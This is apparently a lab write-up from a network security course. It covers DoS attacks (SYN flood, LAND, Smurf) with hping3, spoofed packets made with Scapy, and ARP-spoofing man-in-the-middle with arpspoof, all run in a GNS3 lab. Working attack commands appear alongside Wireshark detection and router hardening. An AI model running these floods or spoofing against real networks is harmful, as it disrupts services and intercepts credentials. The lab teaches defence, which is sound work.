# Lab 01 — DoS Attacks, Packet Injection & ARP Spoofing

## Overview
This lab covers three categories of network attacks launched within a controlled GNS3 environment: Denial of Service, fake packet generation, and identity spoofing via ARP poisoning.

**Tools:** `hping3` `Scapy` `arpspoof` `Wireshark` `tcpdump` `tshark` `netsniff-ng`

---

## Exercise 1 — Denial of Service

### 1.1 SYN Flood (TCP-SYN)
Launched from KaliLinux-2 (Red B) against the gateway `1.1.1.1`.

```bash
sudo hping3 --rand-source -p 80 -S --flood 1.1.1.1
```

**Detection with Wireshark filter:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```
Also monitored via MikroTik tools: `/ip firewall connection print` and Torch.

### 1.2 LAND Attack
Launched from KaliLinux-1 (Red A) against `2.2.2.1` — source and destination IP are set to the same address, causing the target to respond to itself.

```bash
hping3 -a 2.2.2.1 -p 80 -S --flood 2.2.2.1
```

### 1.3 Smurf Attack
Launched from KaliLinux-2 (Red B), spoofing the victim's IP and flooding the broadcast address to amplify ICMP responses.

```bash
sudo hping3 --icmp --flood --spoof 1.1.1.1 <broadcast_ip>
```

**Required setup on victim machines** (to allow broadcast responses):
```bash
# Edit /etc/sysctl.conf:
net.ipv4.conf.default.rp_filter=0
net.ipv4.conf.all.rp_filter=0
net.ipv4.tcp_syncookies=0
net.ipv4.icmp_echo_ignore_broadcasts=0

sudo sysctl -p
```

---

## Exercise 2 — Fake Packet Generation (Scapy)

Two spoofed packets generated from KaliLinux-1 (Red A):

- **Packet 1:** Fake source IP `12.12.12.12` → destination KaliLinux-2
- **Packet 2:** Same fake source, destination KaliLinux-2, UDP port 80

Verified using three CLI dissectors and comparing their output:

| Tool | Description |
|------|-------------|
| `tcpdump` | Lightweight CLI packet capture (libpcap) |
| `tshark` | Wireshark CLI — deep protocol decoding |
| `netsniff-ng` | High-performance Linux sniffer (zero-copy) |

---

## Exercise 3 — ARP Spoofing / Man-in-the-Middle

### 3.1 ARP Spoofing with Scapy
Performed in Red B with at least two Kali Linux machines (attacker + victim).

```python
# Enable packet forwarding on attacker
# Edit /etc/sysctl.conf: net.ipv4.ip_forward=1

# Send spoofed ARP reply
send(ARP(pdst='<gateway_ip>', psrc='<victim_ip>', op='is-at'))
```

ARP tables verified before and after the attack:
- Host: `arp -a`
- Router: `/ip arp print`

### 3.2 ARP Spoofing with arpspoof (MitM)
Full Man-in-the-Middle attack intercepting traffic between two victims.

```bash
# Poison victim A's ARP table
sudo arpspoof -i eth0 -t <IP_victimA> <IP_victimB>

# Poison victim B's ARP table
sudo arpspoof -i eth0 -t <IP_victimB> <IP_victimA>
```

A Telnet session from the victim to the router was captured in Wireshark, exposing credentials in plaintext (`Analyze > Follow > TCP Stream`).

**Results verified:**
- Wireshark captured router credentials
- ARP tables were modified on both hosts
- ICMP traffic from victim to router routed through attacker

### 3.3 ARP Spoofing Detection with Wireshark
Detected by enabling the ARP/RARP protocol filter before launching the attack.

---

## Exercise 4 — Access Control & Service Management (MikroTik)

### 4.1 User Management
Two users created on the MikroTik router with defined access restrictions.

### 4.2 Service Hardening
Insecure services disabled (Telnet, HTTP). Access validated with the new user accounts and confirmed that insecure ports are closed.

Reference: [MikroTik IP/Services](https://wiki.mikrotik.com/Manual:IP/Services)
